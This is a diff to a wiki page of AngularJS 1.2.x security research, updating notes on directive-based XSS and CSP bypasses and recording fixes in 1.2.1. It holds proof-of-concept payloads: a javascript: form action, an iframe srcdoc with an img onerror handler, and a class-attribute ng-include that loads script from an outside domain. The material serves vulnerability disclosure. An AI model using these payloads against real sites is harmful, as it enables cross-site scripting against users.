@@ -363,7 +363,7 @@ function cspSafeGetterFn(key0, key1, key2, key3, key4) {
 }
 }}}
 
-= The State of AngularJS 1.2.0 =
+= The State of AngularJS 1.2.x =
 
 This (currently) most recent version of AngularJS has received an internal security audit and several of the aforementioned issues were fixed or mitigated. A large number of issues showcased here were addressed as well. Which is good and gave AngularJS a positive boost in the security matrix. 
 
@@ -413,9 +413,11 @@ And here's what we still can do - bypassing the overall not-so-well-composed bla
 </head>
 <body>
 	<form ng-attr-action="{{'javascript:'}}alert(1)"><button>CLICK</button></form>
-	<iframe ng-attr-srcdoc="{{'<img src=x onerror=alert(1)>'}}"></a>
+	<iframe ng-attr-srcdoc="{{'<img src=x onerror=alert(1)>'}}"></iframe>
 </body>
 }}}
+
+AngularJS 1.2.1 got these fixed: [https://github.com/angular/angular.js/issues/4927 #4927], [https://github.com/angular/angular.js/pull/4933 #4933]. It is not possible to concatenate values and the `srcdoc` attribute has been flagged as insecure and cannot be used any more.
 
 == HTML Imports ==
 
@@ -427,11 +429,15 @@ This enables another very interesting way to execute arbitrary !JavaScript using
 <html ng-app>
 <head>
 	<meta charset="utf-8">
-	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js"></script>
+	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.3/angular.min.js"></script>
 </head>
 <body>
 	<span class="ng-include:'//ø.pw'"></span>
 </body>
 }}}
 
-In no way should a `class` attribute ever be able to execute arbitrary !JavaScript. This issue currently seems to be the most risky part of AngularJS' directives.
+In no way should a `class` attribute ever be able to execute arbitrary !JavaScript. This issue currently seems to be the most risky part of AngularJS' directives. It further enables yet another CSP bypass in combination with a GIF file:
+
+{{{
+soon to be released...
+}}}
